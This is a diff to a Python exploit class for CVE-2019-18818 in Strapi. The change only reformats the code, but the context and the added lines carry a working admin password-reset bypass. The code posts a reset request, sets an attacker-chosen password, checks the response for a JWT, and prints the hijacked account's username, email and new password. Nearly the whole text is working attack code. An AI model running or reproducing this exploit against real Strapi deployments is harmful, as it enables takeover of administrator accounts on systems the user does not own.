@@ -20,10 +20,16 @@ class CVE2019_18818(StrapiExploitInterface):
             "password": password,
             "passwordConfirmation": password
         }
-        payload = {"email": email, "url":f"{self.url}/admin/plugins/users-permissions/auth/reset-password"}
+        payload = {
+            "email": email, 
+            "url":f"{self.url}/admin/plugins/users-permissions/auth/reset-password"
+        }
         requests.post("{url}/", json=payload, timeout=10)
         try:
-            r = requests.post(f"{self.url}/admin/auth/reset-password", json=params, timeout=10).json()
+            r = requests.post(f"{self.url}/admin/auth/reset-password",
+                json=params,
+                timeout=10
+            ).json()
             if "jwt" not in r:
                 return False
             self.success(f"Password reset successfull.\nUsername: {r['user']['username']}\nEmail: {r['user']['email']}\nPassword: {password}")
